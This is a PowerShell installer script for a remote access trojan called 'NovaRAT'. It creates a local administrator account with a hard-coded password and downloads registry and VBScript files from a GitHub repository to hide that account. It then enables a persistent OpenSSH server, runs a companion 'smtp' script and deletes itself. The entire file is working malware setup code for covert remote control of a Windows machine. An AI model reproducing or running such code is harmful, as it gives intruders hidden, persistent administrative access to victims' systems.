# builds resources for rat
# made by : Code0

# random String for directories
function random_text {
    return -join((65..90)+(97..122) | Get-Random -Count 5 | % {[char]$_})
}

# create local admin for rat
function Create-NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )
    begin {
    }
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
        Write-Verbose "$NewLocalAdmin local user created"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin added to the local administrator group"
    }
    end{
    }
}
$NewLocalAdmin = "novarat"
$Password = (ConvertTo-SecureString "NovaRat!" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

## variables
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location


#create admin user
$NewLocalAdmin = "novarat"
$Password = (ConvertTo-SecureString "NovaRat!" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

#goto temp, make working direcrtory
mkdir $path
cd $path
mv $initial_dir/smtp.txt ./smtp.ps1
./smtp.ps1

#registry to hide local admin
Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/wrev.reg -OutFile "wrev.reg"

#visual basic script to register the registry
Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/calty.vbs -OutFile "calty.vbs"

#enabling persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

#install the registry
./wrev.reg; ./calty

# hide novarat user
cd C:\Users
attrib -h -s -r novarat

# self delete
cd $initial_dir
del installer.ps1

